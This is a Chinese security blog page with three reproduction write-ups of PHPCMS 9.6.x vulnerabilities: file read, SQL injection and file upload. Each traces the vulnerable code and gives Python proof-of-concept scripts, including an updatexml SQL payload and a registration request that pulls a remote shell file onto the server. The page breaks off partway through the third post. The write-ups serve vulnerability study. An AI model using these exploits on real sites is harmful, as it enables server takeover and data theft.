<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="oxcccccc">
<meta property="og:url" content="http:&#x2F;&#x2F;blog.ccreater.top&#x2F;page&#x2F;4&#x2F;index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:locale" content="zh">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-phpcmsv9.6.1任意文件读取" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/13/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
  <time class="dt-published" datetime="2020-02-13T08:09:55.411Z" itemprop="datePublished">2020-02-13</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/13/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">phpcmsv9.6.1任意文件读取</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="phpcmsv9-6-1任意文件读取"><a href="#phpcmsv9-6-1任意文件读取" class="headerlink" title="phpcmsv9.6.1任意文件读取"></a>phpcmsv9.6.1任意文件读取</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞位置: <code>phpcms/modules/content/down.php</code> 。在该文件的 <code>download</code> 方法中最后一行调用了 <code>file_down</code> 文件下载函数，我们可以看到其第一个参数是要读取的文件路径。 </p>
<pre><code class="php">    public function download() {
        $a_k = trim($_GET[&#39;a_k&#39;]);
        $pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);
        $a_k = sys_auth($a_k, &#39;DECODE&#39;, $pc_auth_key);
        if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));
        unset($i,$m,$f,$t,$ip);
        parse_str($a_k);        
        ...
        $starttime = intval($t);
        if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&#39;..&#39;)!==FALSE) showmessage(L(&#39;url_error&#39;));
        $fileurl = trim($f);
        if(!$downid || empty($fileurl) || !preg_match(&quot;/[0-9]{10}/&quot;, $starttime) || !preg_match(&quot;/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/&quot;, $ip) || $ip != ip()) showmessage(L(&#39;illegal_parameters&#39;));    
        $endtime = SYS_TIME - $starttime;
        if($endtime &gt; 3600) showmessage(L(&#39;url_invalid&#39;));
        if($m) $fileurl = trim($s).trim($fileurl);
        if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$fileurl) ) showmessage(L(&#39;url_error&#39;));
        //远程文件
        if(strpos($fileurl, &#39;:/&#39;) &amp;&amp; (strpos($fileurl, pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;)) === false)) { 
            header(&quot;Location: $fileurl&quot;);
        } else {
            if($d == 0) {
                header(&quot;Location: &quot;.$fileurl);
            } else {
                $fileurl = str_replace(array(pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;),&#39;/&#39;), array(pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;),DIRECTORY_SEPARATOR), $fileurl);
                $filename = basename($fileurl);
                //处理中文文件
                if(preg_match(&quot;/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/&quot;, $fileurl)) {
                    $filename = str_replace(array(&quot;%5C&quot;, &quot;%2F&quot;, &quot;%3A&quot;), array(&quot;\\&quot;, &quot;/&quot;, &quot;:&quot;), urlencode($fileurl));
                    $filename = urldecode(basename($filename));
                }
                $ext = fileext($filename);
                $filename = date(&#39;Ymd_his&#39;).random(3).&#39;.&#39;.$ext;
                $fileurl=str_replace(array(&quot;&lt;&quot;,&quot;&gt;&quot;),&quot;&quot;,$fileurl);
                file_down($fileurl, $filename);
            }
        }
    }</code></pre>
<p>我们跟进<code>file_down</code>:</p>
<pre><code class="php">function file_down($filepath, $filename = &#39;&#39;) {
    if(!$filename) $filename = basename($filepath);
    if(is_ie()) $filename = rawurlencode($filename);
    $filetype = fileext($filename);
    $filesize = sprintf(&quot;%u&quot;, filesize($filepath));
    if(ob_get_length() !== false) @ob_end_clean();
    header(&#39;Pragma: public&#39;);
    header(&#39;Last-Modified: &#39;.gmdate(&#39;D, d M Y H:i:s&#39;) . &#39; GMT&#39;);
    header(&#39;Cache-Control: no-store, no-cache, must-revalidate&#39;);
    header(&#39;Cache-Control: pre-check=0, post-check=0, max-age=0&#39;);
    header(&#39;Content-Transfer-Encoding: binary&#39;);
    header(&#39;Content-Encoding: none&#39;);
    header(&#39;Content-type: &#39;.$filetype);
    header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.$filename.&#39;&quot;&#39;);
    header(&#39;Content-length: &#39;.$filesize);
    readfile($filepath);
    exit;
}</code></pre>
<p>可以看到他会直接读取文件然后,exit</p>
<p>我们再看下<code>download</code>中的<code>$fileurl</code>的生成过程:</p>
<pre><code class="php">if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&#39;..&#39;)!==FALSE) showmessage(L(&#39;url_error&#39;));
if($m) $fileurl = trim($s).trim($fileurl);
if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$fileurl) ) showmessage(L(&#39;url_error&#39;));
$fileurl = str_replace(array(pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;),&#39;/&#39;), array(pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;),DIRECTORY_SEPARATOR), $fileurl);
$fileurl=str_replace(array(&quot;&lt;&quot;,&quot;&gt;&quot;),&quot;&quot;,$fileurl);</code></pre>
<p><code>$fileurl</code>由<code>$f</code>产生的,其中不能带有php等关键字,但是我们可以利用最后一行的str_replace来绕过,而<code>$f</code>由<code>parse_str($a_k)</code>得来的</p>
<p>那么接下来我们要找一处</p>
<pre><code class="php">$pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);
$a_k = sys_auth($a_k, &#39;DECODE&#39;, $pc_auth_key);</code></pre>
<p>以<code>$pc_auth_key</code>作为密钥的加密点</p>
<p><img src="https://i.loli.net/2020/02/13/csXBxCmkdWqj3or.png" alt="image3860"></p>
<p>显然只有中间的那个可以</p>
<pre><code class="php">$pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);
$a_k = urlencode(sys_auth(&quot;i=$i&amp;d=$d&amp;s=$s&amp;t=&quot;.SYS_TIME.&quot;&amp;ip=&quot;.ip().&quot;&amp;m=&quot;.$m.&quot;&amp;f=$f&amp;modelid=&quot;.$modelid, &#39;ENCODE&#39;, $pc_auth_key));
$downurl = &#39;?m=content&amp;c=down&amp;a=download&amp;a_k=&#39;.$a_k;</code></pre>
<p>而<code>$i,$m,$f</code>等都是从<code>parse_str($a_k);</code>获得</p>
<pre><code class="php">        parse_str($a_k);
        if(isset($i)) $i = $id = intval($i);
        if(!isset($m)) showmessage(L(&#39;illegal_parameters&#39;));
        if(!isset($modelid)||!isset($catid)) showmessage(L(&#39;illegal_parameters&#39;));
        if(empty($f)) showmessage(L(&#39;url_invalid&#39;));</code></pre>
<p>接下来就跟9.6.0版本的sql注入相同了</p>
<h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><pre><code class="python">import re
import requests
import random
from urllib.parse import quote
def poc(url,proxies={}):
    sess=requests.session()
    sess.get(&quot;%s/index.php?m=wap&amp;siteid=1&quot;%url)
    sess.proxies=proxies
    pre=list(sess.cookies.get_dict())[0][:5]+&quot;_&quot;
    userid=sess.cookies.get_dict()[pre+&quot;siteid&quot;]
    param={
        &quot;m&quot;:&quot;attachment&quot;,
        &quot;c&quot;:&quot;attachments&quot;,
        &quot;a&quot;:&quot;swfupload_json&quot;,
        &quot;src&quot;:&quot;=1&amp;m=aa&amp;i=1&amp;modelid=1&amp;catid=1&amp;f=%s&amp;ss=&quot; % quote(&quot;index.p&lt;h&lt;p&amp;d=1&quot;)
    }
    sess.post(&quot;%s/index.php&quot;%url,params=param,data={&quot;userid_flash&quot;:userid})
    #print(sess.cookies.get_dict())
    a_k=sess.cookies.get_dict()[pre+&quot;att_json&quot;]
    result=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;%(url,a_k)).text
    #print(userid,a_k)
    a_k=re.search(&#39;&#39;&#39;a_k=([^&quot;]*)&#39;&#39;&#39;,result).groups()[0]
    #print(result)
    #print(a_k)
    res=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=download&amp;a_k=%s&quot;%(url,a_k))
    if res.status_code==200 and &quot;pc_base::creat_app();&quot; in res.text:
        return True
    else :
        return False



#,{&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;}
print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.1/&quot;))</code></pre>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集/" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集/</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/13/phpcmsv9.6.1任意文件读取/">http://blog.ccreater.top/2020/02/13/phpcmsv9.6.1任意文件读取/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/02/13/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="cka3ckr350035v4v04srl7k5t" data-title="phpcmsv9.6.1任意文件读取" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-phpcmsv9.6.0SQL注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/13/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/" class="article-date">
  <time class="dt-published" datetime="2020-02-12T16:25:04.827Z" itemprop="datePublished">2020-02-13</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/13/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/">phpcmsv9.6.0SQL注入</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="phpcmsv9-6-0SQL注入"><a href="#phpcmsv9-6-0SQL注入" class="headerlink" title="phpcmsv9.6.0SQL注入"></a>phpcmsv9.6.0SQL注入</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
<li>开启wap</li>
<li>phpcms 版本小于等于9.6.0</li>
</ol>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞信息:</p>
<blockquote>
<p>这个版本的 <strong>SQL注入</strong> 主要在于程序对解密后的数据没有进行过滤. 漏洞文件: <strong>phpcms/modules/content/down.php</strong> 。在其 <strong>init</strong> 方法中，从 <strong>GET</strong> 数据中获取了 <strong>a_k</strong> 的值 ,解密后直接变量覆盖,导致命令执行</p>
</blockquote>
<pre><code class="php">public function init() {
        $a_k = trim($_GET[&#39;a_k&#39;]);
        $a_k = sys_auth($a_k, &#39;DECODE&#39;, pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;));
        if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));
        parse_str($a_k);
        if(isset($i)) $i = $id = intval($i);
        if(!isset($m)) showmessage(L(&#39;illegal_parameters&#39;));
        if(!isset($modelid)||!isset($catid)) showmessage(L(&#39;illegal_parameters&#39;));
        if(empty($f)) showmessage(L(&#39;url_invalid&#39;));
        $allow_visitor = 1;
        $MODEL = getcache(&#39;model&#39;,&#39;commons&#39;);
        $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid][&#39;tablename&#39;];
        $this-&gt;db-&gt;table_name = $tablename.&#39;_data&#39;;
        $rs = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));    
        ...
    }</code></pre>
<p><code>$this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));</code>跟进去</p>
<pre><code class="php">final public function get_one($where = &#39;&#39;, $data = &#39;*&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {
        if (is_array($where)) $where = $this-&gt;sqls($where);
        return $this-&gt;db-&gt;get_one($data, $this-&gt;table_name, $where, $order, $group);
    }</code></pre>
<pre><code class="php">final public function sqls($where, $font = &#39; AND &#39;) {
        if (is_array($where)) {
            $sql = &#39;&#39;;
            foreach ($where as $key=&gt;$val) {
                $sql .= $sql ? &quot; $font `$key` = &#39;$val&#39; &quot; : &quot; `$key` = &#39;$val&#39;&quot;;
            }
            return $sql;
        } else {
            return $where;
        }
    }</code></pre>
<pre><code class="php">public function get_one($data, $table, $where = &#39;&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {
        $where = $where == &#39;&#39; ? &#39;&#39; : &#39; WHERE &#39;.$where;
        $order = $order == &#39;&#39; ? &#39;&#39; : &#39; ORDER BY &#39;.$order;
        $group = $group == &#39;&#39; ? &#39;&#39; : &#39; GROUP BY &#39;.$group;
        $limit = &#39; LIMIT 1&#39;;
        $field = explode( &#39;,&#39;, $data);
        array_walk($field, array($this, &#39;add_special_char&#39;));
        $data = implode(&#39;,&#39;, $field);

        $sql = &#39;SELECT &#39;.$data.&#39; FROM `&#39;.$this-&gt;config[&#39;database&#39;].&#39;`.`&#39;.$table.&#39;`&#39;.$where.$group.$order.$limit;
        $this-&gt;execute($sql);
        $res = $this-&gt;fetch_next();
        $this-&gt;free_result();
        return $res;
    }</code></pre>
<p>没有对解密后的id进行任何过滤</p>
<p>接着要找一个能用相同密钥加密的地方,这样便无需暴露auth_key就能执行恶意sql语句</p>
<p>我们利用<code>set_cookie</code>来生成加密数据</p>
<p><code>setcookie($var, sys_auth($value, &#39;ENCODE&#39;), $time, pc_base::load_config(&#39;system&#39;,&#39;cookie_path&#39;), pc_base::load_config(&#39;system&#39;,&#39;cookie_domain&#39;), $s);</code></p>
<p>查找调用<code>set_cookie</code>且值<code>$value</code>可控的位置</p>
<p><code>phpcms/modules/attachment/attachments.php</code> 文件的 <code>swfupload_json</code> 方法有满足我们需要的代码。(菜鸡直接看别人找到的)</p>
<pre><code class="php">public function swfupload_json() {
        $arr[&#39;aid&#39;] = intval($_GET[&#39;aid&#39;]);
        $arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));
        $arr[&#39;filename&#39;] = urlencode(safe_replace($_GET[&#39;filename&#39;]));
        $json_str = json_encode($arr);
        $att_arr_exist = param::get_cookie(&#39;att_json&#39;);
        $att_arr_exist_tmp = explode(&#39;||&#39;, $att_arr_exist);
        if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) {
            return true;
        } else {
            $json_str = $att_arr_exist ? $att_arr_exist.&#39;||&#39;.$json_str : $json_str;
            param::set_cookie(&#39;att_json&#39;,$json_str);
            return true;            
        }
    }</code></pre>
<p><code>$arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));</code>,跟进<code>safe_replace</code></p>
<pre><code class="php">function safe_replace($string) {
    $string = str_replace(&#39;%20&#39;,&#39;&#39;,$string);
    $string = str_replace(&#39;%27&#39;,&#39;&#39;,$string);
    $string = str_replace(&#39;%2527&#39;,&#39;&#39;,$string);
    $string = str_replace(&#39;*&#39;,&#39;&#39;,$string);
    $string = str_replace(&#39;&quot;&#39;,&#39;&amp;quot;&#39;,$string);
    $string = str_replace(&quot;&#39;&quot;,&#39;&#39;,$string);
    $string = str_replace(&#39;&quot;&#39;,&#39;&#39;,$string);
    $string = str_replace(&#39;;&#39;,&#39;&#39;,$string);
    $string = str_replace(&#39;&lt;&#39;,&#39;&amp;lt;&#39;,$string);
    $string = str_replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;,$string);
    $string = str_replace(&quot;{&quot;,&#39;&#39;,$string);
    $string = str_replace(&#39;}&#39;,&#39;&#39;,$string);
    $string = str_replace(&#39;\\&#39;,&#39;&#39;,$string);
    return $string;
}</code></pre>
<p>虽然这里单引号被过滤了,但是前面是用<code>parse_str($a_k);</code>来恢复变量的,我们可以利用<code>safe_replace</code>能将某些字符替换为空格用url编码来绕过黑名单</p>
<p>但是在调用<code>swfupload_json</code> 前,它还会调用<code>__construct</code>方法</p>
<pre><code class="php">function __construct() {
        pc_base::load_app_func(&#39;global&#39;);
        $this-&gt;upload_url = pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;);
        $this-&gt;upload_path = pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;);        
        $this-&gt;imgext = array(&#39;jpg&#39;,&#39;gif&#39;,&#39;png&#39;,&#39;bmp&#39;,&#39;jpeg&#39;);
        $this-&gt;userid = $_SESSION[&#39;userid&#39;] ? $_SESSION[&#39;userid&#39;] : (param::get_cookie(&#39;_userid&#39;) ? param::get_cookie(&#39;_userid&#39;) : sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));
        $this-&gt;isadmin = $this-&gt;admin_username = $_SESSION[&#39;roleid&#39;] ? 1 : 0;
        $this-&gt;groupid = param::get_cookie(&#39;_groupid&#39;) ? param::get_cookie(&#39;_groupid&#39;) : 8;
        //判断是否登录
        if(empty($this-&gt;userid)){
            showmessage(L(&#39;please_login&#39;,&#39;&#39;,&#39;member&#39;));
        }
    }</code></pre>
<p>我们需要用<code>sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;)</code>来生成<code>$this-&gt;userid</code>,来绕过死亡exit</p>
<p>这次我们还需要找一个地方来生成<code>userid</code>,但是限制更少了,只要<code>$this-&gt;userid</code>不为空即可</p>
<p> 我们可以搜到 <code>phpcms/modules/wap/index.php</code> 文件，在该文件中 <code>$_GET[&#39;siteid&#39;]</code> 可控，并且可以通过 <strong>cookie</strong> 获得加密后的数据,虽然有intval来过滤</p>
<pre><code class="php">function __construct() {        
        $this-&gt;db = pc_base::load_model(&#39;content_model&#39;);
        $this-&gt;siteid = isset($_GET[&#39;siteid&#39;]) &amp;&amp; (intval($_GET[&#39;siteid&#39;]) &gt; 0) ? intval(trim($_GET[&#39;siteid&#39;])) : (param::get_cookie(&#39;siteid&#39;) ? param::get_cookie(&#39;siteid&#39;) : 1);
        param::set_cookie(&#39;siteid&#39;,$this-&gt;siteid);    
        $this-&gt;wap_site = getcache(&#39;wap_site&#39;,&#39;wap&#39;);
        $this-&gt;types = getcache(&#39;wap_type&#39;,&#39;wap&#39;);
        $this-&gt;wap = $this-&gt;wap_site[$this-&gt;siteid];
        define(&#39;WAP_SITEURL&#39;, $this-&gt;wap[&#39;domain&#39;] ? $this-&gt;wap[&#39;domain&#39;].&#39;index.php?&#39; : APP_PATH.&#39;index.php?m=wap&amp;siteid=&#39;.$this-&gt;siteid);
        if($this-&gt;wap[&#39;status&#39;]!=1) exit(L(&#39;wap_close_status&#39;));
    }</code></pre>
<p>于是整个攻击链便完整了</p>
<p>先利用wap来获得<code>userid</code></p>
<p><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=wap&amp;siteid=1</code></p>
<p><code>2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></p>
<p>再利用attachment来获得加密的恶意sql语句</p>
<pre><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;src=(看poc吧)
post:
userid_flash=2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></pre><h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><pre><code class="python">import re
import requests
import random

def poc(url,proxies={}):
    sess=requests.session()
    sess.get(&quot;%s/index.php?m=wap&amp;siteid=1&quot;%url)
    sess.proxies=proxies
    pre=list(sess.cookies.get_dict())[0][:5]+&quot;_&quot;
    userid=sess.cookies.get_dict()[pre+&quot;siteid&quot;]
    param={
        &quot;m&quot;:&quot;attachment&quot;,
        &quot;c&quot;:&quot;attachments&quot;,
        &quot;a&quot;:&quot;swfupload_json&quot;,
        &quot;src&quot;:&quot;=1&amp;id=nobodyasdfsdsf%2;7-(updatexml(1,concat(0x7e,(select%2;0user()),0x7e),1))%23&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=1&amp;ss&quot;
    }
    sess.post(&quot;%s/index.php&quot;%url,params=param,data={&quot;userid_flash&quot;:userid})
    a_k=sess.cookies.get_dict()[pre+&quot;att_json&quot;]
    result=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;%(url,a_k)).text
    #print(userid,a_k)
    if &quot;XPATH syntax error&quot; in result:
        return True
    return False


#,{&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;}
print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.0/&quot;))</code></pre>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集</a></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/13/phpcmsv9.6.0SQL注入/">http://blog.ccreater.top/2020/02/13/phpcmsv9.6.0SQL注入/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/02/13/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/" data-id="cka3ckr330031v4v03vyu24z1" data-title="phpcmsv9.6.0SQL注入" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-phpcms960任意文件上传复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="2020-02-12T13:55:39.359Z" itemprop="datePublished">2020-02-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/">phpcms960任意文件上传复现</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="phpcmsv9-6-0任意文件上传"><a href="#phpcmsv9-6-0任意文件上传" class="headerlink" title="phpcmsv9.6.0任意文件上传"></a>phpcmsv9.6.0任意文件上传</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>phpcms v9.6.0</p>
<p>开启用户注册功能</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>根据网络上提供的poc进行漏洞复现:</p>
<pre><code class="python">import re
import requests


def poc(url):
    u = &#39;{}/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#39;.format(url)
    data = {
        &#39;siteid&#39;: &#39;1&#39;,
        &#39;modelid&#39;: &#39;1&#39;,
        &#39;username&#39;: &#39;test&#39;,
        &#39;password&#39;: &#39;testxx&#39;,
        &#39;email&#39;: &#39;test@test.com&#39;,
        &#39;info[content]&#39;: &#39;&lt;img src=http://url/shell.txt?.php#.jpg&gt;&#39;,
        &#39;dosubmit&#39;: &#39;1&#39;,
    }
    rep = requests.post(u, data=data)

    shell = &#39;&#39;
    re_result = re.findall(r&#39;&amp;lt;img src=(.*)&amp;gt&#39;, rep.content)
    if len(re_result):
        shell = re_result[0]
        print shell
</code></pre>
<p>漏洞的关键位置</p>
<p><code>phpcms/modules/member/index.php</code>:135</p>
<pre><code class="php">if($member_setting[&#39;choosemodel&#39;]) {
    require_once CACHE_MODEL_PATH.&#39;member_input.class.php&#39;;
    require_once CACHE_MODEL_PATH.&#39;member_update.class.php&#39;;
    $member_input = new member_input($userinfo[&#39;modelid&#39;]);        
    $_POST[&#39;info&#39;] = array_map(&#39;new_html_special_chars&#39;,$_POST[&#39;info&#39;]);
    $user_model_info = $member_input-&gt;get($_POST[&#39;info&#39;]);                                        
}</code></pre>
<p><code>$_POST[&#39;info&#39;]</code>被<code>new_html_special_chars</code>处理后,直接作为参数传入<code>$member_input-&gt;get</code></p>
<p>跟进去发现</p>
<pre><code class="php">if(is_array($data)) {
            foreach($data as $field=&gt;$value) {
                ...
                $field = safe_replace($field);
                ...
                $func = $this-&gt;fields[$field][&#39;formtype&#39;];
                if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value);

                $info[$field] = $value;
            }
        }</code></pre>
<p><code>$this-&gt;$func($field, $value);</code>令人浮想联翩的命令,而<code>$func = $this-&gt;fields[$field][&#39;formtype&#39;];</code>,其中<code>$field</code>是我们可控的输入<code>new_html_special_chars($_POST[&#39;info&#39;]) as $field=&gt;$value</code></p>
<p>而<code>$this-&gt;fields[$field][&#39;formtype&#39;];</code>有以下取值,我们可以控制其执行某一函数</p>
<pre><code class="php">$this-&gt;fields[&#39;catid&#39;][&#39;formtype&#39;]=&quot;catid&quot;
$this-&gt;fields[&#39;typeid&#39;][&#39;formtype&#39;]=&quot;typeid&quot;
$this-&gt;fields[&#39;title&#39;][&#39;formtype&#39;]=&quot;title&quot;
$this-&gt;fields[&#39;keywords&#39;][&#39;formtype&#39;]=&quot;keyword&quot;
$this-&gt;fields[&#39;copyfrom&#39;][&#39;formtype&#39;]=&quot;copyfrom&quot;
$this-&gt;fields[&#39;description&#39;][&#39;formtype&#39;]=&quot;textarea&quot;
$this-&gt;fields[&#39;updatetime&#39;][&#39;formtype&#39;]=&quot;datetime&quot;
$this-&gt;fields[&#39;content&#39;][&#39;formtype&#39;]=&quot;editor&quot;
$this-&gt;fields[&#39;thumb&#39;][&#39;formtype&#39;]=&quot;image&quot;
$this-&gt;fields[&#39;relation&#39;][&#39;formtype&#39;]=&quot;omnipotent&quot;
